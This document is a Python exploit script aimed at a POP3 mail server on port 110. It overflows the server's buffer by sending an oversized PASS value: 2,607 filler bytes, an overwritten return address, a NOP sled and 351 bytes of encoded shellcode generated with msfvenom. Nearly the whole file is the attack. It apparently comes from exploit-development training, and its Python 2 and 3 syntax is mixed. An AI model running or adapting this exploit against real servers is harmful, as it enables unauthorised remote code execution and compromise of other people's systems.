#!/usr/bin/env python3

import socket
import struct

HOST = '192.168.xxx.xxx'  # The server's hostname or IP address
PORT = 110        # The port used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'A'*2607
buffer += '\xe1\xbc\x08\x76'
buffer += '\x90'*5

buffer += '\xcc'

#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of python file: 1712 bytes
buf =  b""
buf += b"\xbd\xbd\xec\x24\xbb\xdb\xcd\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x52\x31\x6b\x12\x83\xc3\x04\x03\xd6\xe2\xc6"
buf += b"\x4e\xd4\x13\x84\xb1\x24\xe4\xe9\x38\xc1\xd5\x29\x5e"
buf += b"\x82\x46\x9a\x14\xc6\x6a\x51\x78\xf2\xf9\x17\x55\xf5"
buf += b"\x4a\x9d\x83\x38\x4a\x8e\xf0\x5b\xc8\xcd\x24\xbb\xf1"
buf += b"\x1d\x39\xba\x36\x43\xb0\xee\xef\x0f\x67\x1e\x9b\x5a"
buf += b"\xb4\x95\xd7\x4b\xbc\x4a\xaf\x6a\xed\xdd\xbb\x34\x2d"
buf += b"\xdc\x68\x4d\x64\xc6\x6d\x68\x3e\x7d\x45\x06\xc1\x57"
buf += b"\x97\xe7\x6e\x96\x17\x1a\x6e\xdf\x90\xc5\x05\x29\xe3"
buf += b"\x78\x1e\xee\x99\xa6\xab\xf4\x3a\x2c\x0b\xd0\xbb\xe1"
buf += b"\xca\x93\xb0\x4e\x98\xfb\xd4\x51\x4d\x70\xe0\xda\x70"
buf += b"\x56\x60\x98\x56\x72\x28\x7a\xf6\x23\x94\x2d\x07\x33"
buf += b"\x77\x91\xad\x38\x9a\xc6\xdf\x63\xf3\x2b\xd2\x9b\x03"
buf += b"\x24\x65\xe8\x31\xeb\xdd\x66\x7a\x64\xf8\x71\x7d\x5f"
buf += b"\xbc\xed\x80\x60\xbd\x24\x47\x34\xed\x5e\x6e\x35\x66"
buf += b"\x9e\x8f\xe0\x29\xce\x3f\x5b\x8a\xbe\xff\x0b\x62\xd4"
buf += b"\x0f\x73\x92\xd7\xc5\x1c\x39\x22\x8e\xe2\x16\x2d\x35"
buf += b"\x8b\x64\x2d\xd8\x17\xe0\xcb\xb0\xb7\xa4\x44\x2d\x21"
buf += b"\xed\x1e\xcc\xae\x3b\x5b\xce\x25\xc8\x9c\x81\xcd\xa5"
buf += b"\x8e\x76\x3e\xf0\xec\xd1\x41\x2e\x98\xbe\xd0\xb5\x58"
buf += b"\xc8\xc8\x61\x0f\x9d\x3f\x78\xc5\x33\x19\xd2\xfb\xc9"
buf += b"\xff\x1d\xbf\x15\x3c\xa3\x3e\xdb\x78\x87\x50\x25\x80"
buf += b"\x83\x04\xf9\xd7\x5d\xf2\xbf\x81\x2f\xac\x69\x7d\xe6"
buf += b"\x38\xef\x4d\x39\x3e\xf0\x9b\xcf\xde\x41\x72\x96\xe1"
buf += b"\x6e\x12\x1e\x9a\x92\x82\xe1\x71\x17\xb2\xab\xdb\x3e"
buf += b"\x5b\x72\x8e\x02\x06\x85\x65\x40\x3f\x06\x8f\x39\xc4"
buf += b"\x16\xfa\x3c\x80\x90\x17\x4d\x99\x74\x17\xe2\x9a\x5c"

buffer += buf
print(buffer+'\n')
try:
	print "\nSending evil buffer..."
	s.connect(('192.168.xxx.xxx',110))
	data = s.recv(1024)
        print("Connessione: "+ data)
        s.send('USER:test' +'\r\n')
	data = s.recv(1024)
        print("Login: " + data)
        s.send('PASS' + buffer + '\r\n')
	data = s.recv(1024)
        print("Password: ",data)
	s.close()
	print "\nDone!"
except:
	print "Could not connect to POP3!"
